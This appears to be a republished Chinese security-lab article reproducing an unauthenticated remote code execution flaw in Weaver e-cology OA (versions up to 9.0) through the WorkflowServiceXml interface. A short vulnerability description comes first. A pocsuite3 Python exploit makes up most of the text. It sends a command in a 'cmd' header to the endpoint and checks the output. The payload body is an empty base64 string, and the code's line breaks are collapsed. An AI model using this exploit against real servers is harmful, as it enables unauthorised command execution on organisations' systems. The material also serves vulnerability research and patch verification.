# 【漏洞复现】泛微 OA E-Cology WorkflowServiceXml RCE——燕云实验室

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyMTU4NTI2OQ==&mid=2247493972&idx=1&sn=bfd1d4058388df875479b1c2a321054d&chksm=f9da7e4eceadf7583edf8941e0ce628b11e8ec8f6c69345502f67e220dfb99e0f2747136ba6c&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzUyMTU4NTI2OQ==&mid=2247493972&idx=1&sn=bfd1d4058388df875479b1c2a321054d&chksm=f9da7e4eceadf7583edf8941e0ce628b11e8ec8f6c69345502f67e220dfb99e0f2747136ba6c&scene=27#wechat_redirect)

![](../Images/aae4c40d887e7cd9218f50f4a9146bea.png)

  

“燕云实验室”是河北千诚电子科技有限公司成立的网络安全攻防技术研究实验室。主要研究方向为渗透测试、代码审计、逆向分析、漏洞研究、CTF对抗、威胁情报、应急响应等。

  

![](../Images/1bba2dcd998a12615c825bb8c787e970.png)  

漏洞描述

  
![](../Images/30f76865d1a9aaefe8a55d922b801c54.png)

  

> The workflowservicexml interface of the pan micro e-cology OA system can be accessed without authorization. The attacker can construct a specific HTTP request to bypass some security restrictions of the pan micro itself by calling this interface, so as to achieve remote code execution.

  

![](../Images/1bba2dcd998a12615c825bb8c787e970.png)  

‍影响版本

  
![](../Images/30f76865d1a9aaefe8a55d922b801c54.png)

E-cology <= 9.0

  

![](../Images/1bba2dcd998a12615c825bb8c787e970.png)

#!/usr/bin/env python# coding: utf-8from urllib.parse import urlparsefrom pocsuite3.api import requests as reqfrom pocsuite3.api import register_pocfrom pocsuite3.api import Output, POCBasefrom pocsuite3.api import POC_CATEGORY, VUL_TYPE    import hashlibimport randomimport stringimport base64
class TestPOC(POCBase):    vulID = '66'    version = '1'    author = 'zhzyker'    vulDate = '2015-06-14'    createDate = '2021-06-14'    updateDate = '2021-06-14'    references = ['https://github.com/zhzyker/vulmap']    name = 'E-cology OA WorkflowServiceXml RCE: time-2021-0515'    appName = 'E-cology'    appVersion = '< 9.0'    vulType = VUL_TYPE.CODE_EXECUTION    category = POC_CATEGORY.EXPLOITS.REMOTE    desc = '''        E-cology OA WorkflowServiceXml RCE: time-2021-0515    '''
    def _verify(self):        result = {}        pr = urlparse(self.url)        if pr.port:            ports = [pr.port]        else:            ports = [8080]        for port in ports:            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)            TIMEOUT = 10            st = ''.join(random.choices(string.ascii_letters+string.digits, k=8))            md = hashlib.md5("".join(st).encode('utf-8')).hexdigest()            cmd = "echo " + md            headers = {                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',                'SOAPAction': '""',                'cmd': cmd,                "Content-Type": "text/xml;charset=UTF-8"            }            data = base64.b64decode("")            try:                self.request = req.post(self.url+"/services%20/WorkflowServiceXml", data=data, headers=headers, timeout=TIMEOUT, verify=False)                if md in self.request.text and self.request.status_code == 500:                        result['VerifyInfo'] = {}                        result['VerifyInfo']['URL'] = target                        result['VerifyInfo']['NEWDATA'] = self.data_send_info                        break            except:                pass        return self.parse_output(result)
    def _attack(self):        return self._verify()
    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail('not vulnerability')        return output
register_poc(TestPOC)
